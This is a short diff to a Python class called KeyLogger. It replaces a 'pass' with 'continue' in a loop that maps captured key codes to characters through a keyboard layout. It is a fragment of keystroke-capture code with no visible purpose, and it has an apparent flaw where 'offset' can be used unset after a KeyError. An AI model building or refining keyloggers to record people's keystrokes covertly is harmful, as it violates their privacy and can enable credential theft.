@@ -89,7 +89,7 @@ class KeyLogger:
                         print(f"{key_code=} ")
                         offset: int = self.keyboard_layout[str(key_code)]
                         if offset is None:
-                            pass
+                            continue
                     except KeyError:
                         pass
                     char: chr = chr(offset + key_code)
